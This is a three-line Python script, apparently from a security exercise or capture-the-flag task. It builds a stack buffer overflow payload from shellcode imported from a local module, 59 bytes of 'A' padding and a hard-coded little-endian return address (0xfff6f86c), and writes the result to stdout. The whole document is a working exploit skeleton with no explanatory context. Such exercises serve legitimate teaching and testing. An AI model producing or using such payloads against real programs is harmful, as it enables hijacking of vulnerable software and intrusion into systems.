from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode + b'A'*59 + 0xfff6f86c.to_bytes(4,'little'))